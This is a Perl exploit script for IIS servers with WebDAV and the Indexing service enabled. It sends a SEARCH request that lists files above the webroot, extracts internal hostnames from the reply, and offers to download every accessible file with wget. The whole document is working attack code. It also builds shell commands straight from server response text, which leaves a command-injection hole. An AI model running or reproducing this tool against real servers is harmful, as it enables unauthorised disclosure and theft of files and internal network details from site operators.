#!/usr/bin/perl
# SEARCH.pl
# =========
# IIS webservers which have WebDAV and Indexing service enabled allow a malicious user to request
# a listing of all files above the webroot. This is the case in around 30-40% of IIS webservers tested.
# This script will issue the SEARCH method request and ouput a parsed raw human readable file of responses
# from the IIS server. These are then parsed to show internal hostname information leaks and attacker is 
# prompted to mirror the files (including internally referenced files).
use IO::Socket;
print "[ IIS WebDAV+Indexing HTTP SEARCH file listing exploit\n";
if(!$ARGV[0] || !$ARGV[1]){
	die "require <server> <output filename>";
}
$sock = new IO::Socket::INET (PeerAddr => $ARGV[0],
                              PeerPort => 80,
                              Proto    => 'tcp');
die "Cannot connect $!" unless $sock;
$request = "SEARCH / HTTP/1.1\nHost: ";
$request .= $ARGV[0];
$request .= "\nContent-Type: text/xml\nContent-Length: 133\n\n<?xml version=\"1.0\"?>\n<g:searchrequest xmlns:g=\"DAV:\">\n<g:sql>\nSelect \"DAV:displayname\"";
$request .= " from scope()\n</g:sql>\n</g:searchrequest>\n\n\n\n\n";
print $sock "$request";
print "[ Sent SEARCH method request\n";
sleep(1);
print "[ Raw human readable results will be output to '$ARGV[1]'\n";
$a = 0;
while(<$sock>)
{
	if($_ =~ /HTTP\/1\.1 207/)
	{
		$a = 1;
	}
	if($a==1)
	{	
		chomp($_);
		$_ =~ s/\x0d//g;
		$_ =~ s/ffee//g;	
		$_ =~ s/<\/a:response>//g;
		$_ =~ s/<\/a:propstat>//g;
		$_ =~ s/<\/a:displayname>/\r\n/g;	
		$_ =~ s/<\/a:href>/\r\n/g;	
		$_ =~ s/<\/a:prop>//g;	
		$_ =~ s/<\/a:status>/\r\n/g;		
		$_ =~ s/<a:response>//g;
		$_ =~ s/<a:propstat>//g;
		$_ =~ s/<a:displayname>//g;	
		$_ =~ s/<a:href>//g;	
		$_ =~ s/<a:prop>//g;	
		$_ =~ s/<a:displayname>//g;	
		$_ =~ s/<a:status>//g;
		$_ =~ s/\">/\">\r\n/g;
		open(OUT,">>","$ARGV[1]");
		binmode(OUT);
		print OUT "$_";
		close(OUT);
	}	
}
if($a == 0)
{
	open(OUT,">>","$ARGV[1]");
	binmode(OUT);
	print OUT "$ARGV[0] does not appear vulnerable to this attack\n";
	close(OUT);
	die "$ARGV[0] does not appear vulnerable to this attack\n";
}
open(IN,"<","$ARGV[1]");
	while(<IN>){
	if($_ =~ /http:\/\//){
		($junk,$url) = split /http:\/\//,$_;
		($url,$path) = split /\//,$url;
		if($url =~ /$ARGV[0]/){
		}
		else{
			chomp($url);
			chomp($path);
			print "[ Potentially internal information: $url Path: $path\n";
		}
	}
}
close(IN);
print "[ Mirror all accessible files?\n[ [y/N] -> ";
if(<STDIN> =~ /^[yY]/){
	print "[ Downloading all accessible files\n";
	open(IN,"<","$ARGV[1]");
	while(<IN>){
		if($_ =~ /HTTP\/1\.1 200 OK/){
			system("wget -x $last");
		}
		if($_ =~ /HTTP\/1\.1 502 Bad Gateway/){
			($junk,$url) = split /http:\/\//,$last;
			($url,$path) = split /\//,$url;
			chomp($path);
			$path =~ s/\\/\//g;
			system("wget -x $ARGV[0]/$path");
		}
		$last = $_;
	}
	close(IN);
}
print "[ Done\n";
